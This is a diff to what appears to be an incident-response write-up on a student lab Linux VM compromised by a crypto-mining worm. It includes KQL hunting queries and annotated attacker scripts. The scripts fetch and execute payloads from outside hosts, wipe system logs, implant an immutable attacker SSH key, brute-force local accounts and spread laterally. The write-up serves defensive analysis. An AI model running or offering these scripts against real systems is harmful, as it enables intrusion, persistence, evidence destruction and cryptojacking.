@@ -46,7 +46,7 @@ VirusTotal analysis of the recovered binary returned a **46 / 63 detection score
 
 ---
 
-## Investigation
+# Investigation
 
 ### Initial Detection: Malware or PUA Observed in MDE
 
@@ -65,6 +65,9 @@ VirusTotal analysis of the recovered binary returned a **46 / 63 detection score
    - Suspicious file or content ingress
    - Executable permission added to file or directory
    - Suspicious shell script launched
+ 
+    <br>
+   
 - Along with potentially suspicious commands:
    - `wget` (Remote file download)
    - `curl` (Payload retrieval / C2 communication)
@@ -117,6 +120,7 @@ DeviceProcessEvents
    - Only root can write to `/usr/bin`
    - Regular users cannot create files there
    - It’s considered a protected system directory
+   - **`/usr/bin/` survives reboots**
  
   <br>
 
@@ -168,11 +172,10 @@ Lab configuration included:
 
 ### Student changes Root password | AHTKzAEv
 
-- Student begins the lab, changing root password to 'root'
-   - `2026-01-30T13:50:32.826013Z` — `/etc/shadow` edited by _Labuser_ via root (likely a password change)
+- Student begins the lab, changing root password to _root_
+   - `2026-01-30T13:50:32.826013Z` — `/etc/shadow` edited by _Labuser_ via root (student password change)
    - `2026-01-30T14:02:04.257228Z` ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created
-
-Within minutes, `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes.
+   - `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes
 
 ```kql
 DeviceFileEvents
@@ -188,16 +191,22 @@ DeviceFileEvents
 
 <Br>
 
-- File lifecycle after creation:
-   - 2:02:04 — `AHTKzAEv` and multiple `x.sh` files created, initial payload and helper scripts
-   - 2:02:04.957 — `retea` in `/dev/shm` created
+**File lifecycle after creation** 
+
+- 2:02:04 — `AHTKzAEv` and multiple `x.sh` files created
+   -  initial payload and helper scripts
+- 2:02:04.957 — `retea` in `/dev/shm` created
    - `/dev/shm` is shared memory. malware sometimes drops helpers here for fast execution or stealth (RAM-only execution)
-   - 2:02:05 — `/root/.ssh/authorized_keys` updated. Allows persistence via SSH (attacker can log in without a password)
-   - 2:02:05 — `/etc/passwd` and `/etc/shadow` updated. Confirms the attacker escalated privileges / added backdoors, possibly adding a new root password
-- Repeated FileCreated / FileDeleted events for x.sh and AHTKzAEv
+- 2:02:05 — `/root/.ssh/authorized_keys` updated
+  - Allows persistence via SSH (attacker can log in without a password)
+- 2:02:05 — `/etc/passwd` and `/etc/shadow` updated
+   - Confirms the attacker escalated privileges / added backdoors, possibly adding a new root password
+- Repeated FileCreated / FileDeleted events for `x.sh` and `AHTKzAEv`
    - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
    - Deleting files is often to avoid forensic detection
-   - 
+
+     <Br>
+     
 ```
 /var/tmp/AHTKzAEv          <- the malicious binary
   └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
@@ -211,7 +220,7 @@ DeviceFileEvents
 
 ### Malware Injects Password Hash for Root
 
-**Command:** usermod -p ********** root
+- **Command:** usermod -p ********** root
    - `usermod` → Linux command used to modify a user account
    - `-p **********` → Sets the user’s password hash directly (not plaintext)
    - `root` → The username being modified
@@ -219,7 +228,7 @@ DeviceFileEvents
 - ********** is the masked hash, so you don’t see it
 - By replacing or adding a root hash with its own, malware creates a backdoor
 - Student is still able to log in/won't get booted off
-- 
+  
  <Br>
 
  <img width="1151" height="344" alt="image" src="https://github.com/user-attachments/assets/58e42a90-b7db-41a8-b939-cc96f061c592" />
@@ -229,7 +238,7 @@ DeviceFileEvents
 - This takes place just 12 minutes after student's password change
 - Student wouldn't have had ample time to complete lab before device is compromised
 
-- <br>
+ <br>
 
 <img width="788" height="386" alt="image" src="https://github.com/user-attachments/assets/7adfaba9-8836-42cf-a495-8014fff03e91" />
 
@@ -361,6 +370,8 @@ rm -rf .bash_history ~/.bash_history
     <Br>
 
 <img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />
+
+  <br>
   
 - `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
   - EX. `tdrbhhtkky`, `omicykvmml`
@@ -368,8 +379,7 @@ rm -rf .bash_history ~/.bash_history
   - Avoid hash-based detections
   - Avoids filename-based detections
   - Makes IOC-based hunting harder
-
-Prevents defenders from blocking a single file
+  - Prevents defenders from blocking a single file
 - These are clones or secondary payloads:
    - Backdoors
    - Miner binaries
@@ -381,7 +391,7 @@ Prevents defenders from blocking a single file
 
 <Br>
 
-- **Crontab modification**
+**Crontab modification**
 - The malware edits `/etc/crontab` to remove old references to `gcc.sh` and add a new entry:
    - `*/3 * * * * root /etc/cron.hourly/gcc.sh`
    - malware will now run every 3 minutes
@@ -399,7 +409,7 @@ Prevents defenders from blocking a single file
    - downloaded on two different devices
    - from same IP `23.160.56.194`
    - to the same file name `ygljglkjgfg`
-   - on 1/27 and 2/2
+   - on 1/27/2026 and 2/2/2026
    - both with the same file size `548616`
    - but with two different SHA256
  
@@ -413,7 +423,7 @@ Prevents defenders from blocking a single file
 - FileType: Elf (Executable and Linkable Format) even though it's named .txt
    - Not actually a text file, but a compiled Linux binary
    - Name file .txt to avoid suspicion
-   - Download → Rename → Execute
+   - Download → Rename → Execute 
 
  **VirusTotal page for both SHA256 Hashes**    
 <img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" /> <br>
@@ -439,59 +449,361 @@ Prevents defenders from blocking a single file
 
 The attacker deliberately renamed trusted system binaries:
 
-mv /usr/bin/wget /usr/bin/good  
-mv /bin/wget /bin/good  
+`mv /usr/bin/wget /usr/bin/good` <br>
+`mv /bin/wget /bin/good`  
 
 Renaming trusted utilities allows continued payload delivery while bypassing simplistic detections that rely on binary names.
+
+<Br>
+
+<img width="2299" height="681" alt="image" src="https://github.com/user-attachments/assets/e48416ac-e04d-4418-b64e-c4ace68f1c18" /> <br>
+
+<br>
+
+**Full command with annotations**
+```bash
+# --- Launch new bash shell to execute payload ---
+bash -c '                                      # Execute entire malicious routine inside a subshell
+
+# --- Identify writable directory (privilege-aware staging) ---
+wdir="/bin"                                    # Default working directory
+for i in "/bin" "/home" "/root" "/tmp" "/usr" "/etc"
+do
+    if [ -w $i ]                               # Check if directory is writable
+    then
+        wdir=$i                                # Use first writable directory found
+        break
+    fi
+done
+cd $wdir                                       # Change into writable directory
+
+# --- Download & execute first-stage payload (p.txt) via curl ---
+curl http://23.160.56.194/p.txt -o ygljglkjgfg0 # Download payload and save as randomized filename
+chmod +x ygljglkjgfg0                           # Make file executable
+./ygljglkjgfg0                                  # Execute payload
+
+# --- Retry download using wget (redundancy) ---
+wget http://23.160.56.194/p.txt -O ygljglkjgfg1 # Download same payload using wget
+chmod +x ygljglkjgfg1
+./ygljglkjgfg1
+
+# --- Retry using renamed wget binary ("good") ---
+good http://23.160.56.194/p.txt -O ygljglkjgfg2 # "good" is renamed wget (defense evasion)
+chmod +x ygljglkjgfg2
+./ygljglkjgfg2
+
+sleep 2                                         # Brief delay between payload stages
+
+# --- Download & execute second-stage payload (r.txt) ---
+wget http://23.160.56.194/r.txt -O sdf3fslsdf13
+chmod +x sdf3fslsdf13
+./sdf3fslsdf13
+
+# --- Retry via renamed wget ---
+good http://23.160.56.194/r.txt -O sdf3fslsdf14
+chmod +x sdf3fslsdf14
+./sdf3fslsdf14
+
+# --- Retry via curl ---
+curl http://23.160.56.194/r.txt -o sdf3fslsdf15
+chmod +x sdf3fslsdf15
+./sdf3fslsdf15
+
+sleep 2                                         # Additional delay for execution timing
+
+# --- Rename system wget binary (defense evasion) ---
+mv /usr/bin/wget /usr/bin/good                  # Rename wget to evade simple detections
+mv /bin/wget /bin/good
+
+# --- Anti-forensics: Clear command history ---
+cat /dev/null >/root/.bash_history              # Wipe root bash history
+
+# --- Anti-forensics: Wipe authentication & system logs ---
+cat /dev/null > /var/log/wtmp                   # Clear login history
+cat /dev/null > /var/log/btmp                   # Clear failed login attempts
+cat /dev/null > /var/log/lastlog                # Clear last login records
+cat /dev/null > /var/log/secure                 # Clear auth logs (RHEL/CentOS)
+cat /dev/null > /var/log/boot.log               # Clear boot logs
+cat /dev/null > /var/log/cron                   # Clear cron activity logs
+cat /dev/null > /var/log/dmesg                  # Clear kernel ring buffer logs
+cat /dev/null > /var/log/firewalld              # Clear firewall logs
+cat /dev/null > /var/log/maillog                # Clear mail logs
+cat /dev/null > /var/log/messages               # Clear general system messages
+cat /dev/null > /var/log/spooler                # Clear print spool logs
+cat /dev/null > /var/log/syslog                 # Clear syslog
+cat /dev/null > /var/log/tallylog               # Clear login tracking counters
+cat /dev/null > /var/log/yum.log                # Clear package manager logs
+cat /dev/null >/root/.bash_history              # Ensure history cleared again
+
+# --- Check for gcc process PID file (possible miner persistence check) ---
+ls -la /var/run/gcc.pid                         # Check for existing gcc-named process (common miner disguise)
+
+exit $?                                         # Exit script returning last command status
+'
+```
 
 ---
 
 ### Persistence via /etc/init.d
 
-Persistence was established by creating an init script:
+**`ygljglkjgfg0` is created/copied to _/etc/init.d/_**
+-`/etc/init.d/` is used for startup services Linux systems
+   - That means it would run automatically at boot
+- This confirms **intentional long-term persistence**. 
+
+<Br>
 
 ```kql
 DeviceFileEvents  
 | where DeviceName == "linux-programmatic-fix-michael"  
 | where FolderPath startswith "/etc/init.d"  
-| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine  
+| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine
 | order by TimeGenerated desc  
 ```
 
-Why this is significant:
+<br>
 
-- `/etc/init.d` scripts execute automatically on boot  
-- Execution occurs as `root`  
-- Persistence survives reboots and user logouts  
+<img width="2017" height="430" alt="image" src="https://github.com/user-attachments/assets/bd2124e1-4894-453b-aeaf-3438736562fe" />
 
-This confirms **intentional long-term persistence**.
-
----
-
-### Log Tampering via cat /dev/null
-
-The attacker deliberately destroyed forensic evidence by truncating multiple logs:
-
-cat /dev/null >/root/.bash_history  
-cat /dev/null >/var/log/wtmp  
-cat /dev/null >/var/log/btmp  
-cat /dev/null >/var/log/lastlog  
-cat /dev/null >/var/log/secure  
-cat /dev/null >/var/log/syslog  
-
-Because these logs were cleared on the host, historical entries no longer existed for ingestion into Log Analytics, significantly limiting post-incident visibility.
+<br>
 
 ---
 
 ### SSH Key Implantation
 
-A persistent SSH backdoor was implanted:
+**A persistent SSH backdoor was implanted:**
 
+<br>
+
+```
 chattr -ia ~/.ssh/authorized_keys  
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
 chattr +ai ~/.ssh/authorized_keys  
+```
 
-Setting the immutable attribute (`+i`) prevents easy removal and ensures continued access even if credentials are rotated
+<br>
+
+- Setting the immutable attribute (`+i`) prevents easy removal and ensures continued access even if credentials are rotated
+
+<br>
+
+<img width="1152" height="343" alt="image" src="https://github.com/user-attachments/assets/27c03eb7-950e-42d1-81a9-6bdbaea4f2ab" />
+
+<br>
+
+The threat actor established persistent passwordless SSH access by overwriting authorized_keys and setting immutable attributes to prevent removal.
+
+<br>
+
+**Full command with annotations**
+```bash
+# --- Stage 1: Execute cleanup script ---
+chmod +x clean.sh                # Make clean.sh executable
+sh clean.sh                      # Run cleanup actions (likely remove temp files / old malware traces)
+rm -rf clean.sh                  # Delete script to remove evidence
+
+# --- Stage 2: Execute setup script ---
+chmod +x setup.sh                # Make setup.sh executable
+sh setup.sh                      # Run setup actions (likely prep malware staging directories)
+rm -rf setup.sh                  # Delete script to remove evidence
+
+# --- Stage 3: Create staging directory ---
+mkdir -p *******                  # Create folder for malware payloads or data
+
+# --- Stage 4: Prepare SSH for persistence ---
+chattr -ia ~/.ssh/authorized_keys # Remove immutable/append-only flags so file can be overwritten
+
+# --- Stage 5: Overwrite SSH authorized keys with attacker key ---
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... rsa-key-20230629" > ~/.ssh/authorized_keys
+
+# --- Stage 6: Protect attacker key from removal ---
+chattr +ai ~/.ssh/authorized_keys # Set immutable and append-only flags to prevent deletion or modification
+
+# --- Stage 7: System reconnaissance / reporting ---
+uname -a                          # Output system info (likely sent to attacker)
+echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A" # Hex for "auth_ok" (signal success to C2)
+```
+
+<br>
+
+**What this script is doing:**
+   - Malware prepares environment (cleanup & setup scripts)
+   - Staging directory created for payloads
+   - SSH persistence established with attacker key
+   - SSH key is protected from modification or removal
+   - System info is exposed
+   - Signal sent to confirm successful compromise
+   - Student/root password changes are bypassed by attacker key
+
+**Outcome:**
+   - Full passwordless SSH access for attacker
+   - Persistent backdoor hard to remove
+   - Attacker added their own SSH key, alowing a silent login
+   - depending on how system logs SSH, standard login record might not generate
+   - This explains how the student wasn't booted: their account wasn’t actively interrupted
+
+<br>
+
+---
+
+### retea Crypto Mining Worm
+
+
+```bash
+# ================================
+# Stage 1 — Key Check / Execution Gate
+# ================================
+
+./retea -c '
+key=$1
+user=$2
+
+# Hardcoded access key check
+if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
+then
+    echo -e ""          # If correct key → continue silently
+else
+    echo Logged with successfully.
+
+    # --- Kill competitors & remove traces ---
+    rm -rf .retea
+    crontab -r
+    pkill xrx haiduc blacku xMEu Opera cnrig java xmrig
+    killall java cnrig xmrig
+
+    # --- Remove competing miners & staging folders ---
+    cd /var/tmp
+    rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp
+    mkdir /tmp/.tmp
+    rm -rf xmrig .diicot .black Opera xmrig.1
+
+    # --- Download payload from fallback domains ---
+    wget -q dinpasiune.com/payload \
+      || curl -O -s -L dinpasiune.com/payload \
+      || wget 85.31.47.99/payload \
+      || curl -O -s -L 85.31.47.99/payload
+
+    chmod +x *
+    ./payload >/dev/null 2>&1 & disown
+
+    # --- Clear history for stealth ---
+    history -c
+    rm -rf .bash_history ~/.bash_history
+
+    # --- Execute secondary hidden component ---
+    chmod +x .teaca
+    ./.teaca >/dev/null 2>&1
+    history -c
+    rm -rf .bash_history ~/.bash_history
+fi
+
+
+# ================================
+# Stage 2 — System Tuning for Mining
+# ================================
+
+rm -rf /etc/sysctl.conf
+echo "fs.file-max = 2097152" > /etc/sysctl.conf
+sysctl -p
+
+ulimit -Hn
+ulimit -n 99999 -u 999999
+
+
+# ================================
+# Stage 3 — Setup Hidden Working Directory
+# ================================
+
+cd /dev/shm
+mkdir /dev/shm/.x
+mv network .x/
+cd .x
+
+rm -rf retea ips iptemp iplist pass
+
+
+# ================================
+# Stage 4 — Generate Credential Wordlist
+# ================================
+
+# Extract all valid login users
+useri=$(cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync | grep -v halt | grep -v shutdown | cut -d: -f1)
+
+echo $useri > .usrs
+
+# Build brute-force password list
+for us in $(cat .usrs); do
+    printf "$us $us\n" >> pass
+    printf "$us ${us}123\n" >> pass
+    printf "$us 123456\n" >> pass
+    printf "$us password\n" >> pass
+    printf "$us 1qaz@WSX\n" >> pass
+    printf "$us Huawei@123\n" >> pass
+    printf "$us qaz123!@#\n" >> pass
+    # (Many additional weak combos omitted here for brevity)
+done
+
+
+# ================================
+# Stage 5 — Shuffle Target IP List
+# ================================
+
+cat bios.txt | sort -R | uniq > i
+cat i > bios.txt
+
+
+# ================================
+# Stage 6 — Lateral Movement
+# ================================
+
+./network "
+    # Remove old staging folders
+    rm -rf /var/tmp/Documents /tmp/cache
+    mkdir /var/tmp/Documents
+
+    # Remove persistence & SSH restrictions
+    crontab -r
+    chattr -iae ~/.ssh/authorized_keys
+
+    # Kill competing miners
+    pkill Opera cnrig java xmrig
+    killall java cnrig xmrig
+
+    # Deploy miner payload
+    mv /var/tmp/diicot /var/tmp/Documents/.diicot
+    mv /var/tmp/kuak /var/tmp/Documents/kuak
+
+    cd /var/tmp/Documents
+    chmod +x .*
+    /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
+
+    # Execute cache payload
+    cd /tmp/
+    chmod +x cache
+    ./cache >/dev/null 2>&1 & disown
+
+    # Clear history
+    history -c
+    rm -rf .bash_history ~/.bash_history
+"
+
+
+# ================================
+# Stage 7 — Self Cleanup
+# ================================
+
+function Miner {
+    rm -rf /dev/shm/retea /dev/shm/.magic
+    rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot
+    rm -rf ~/.bash_history
+    history -c
+}
+
+Miner
+'
+```
+
+<br>
 
 ---
 
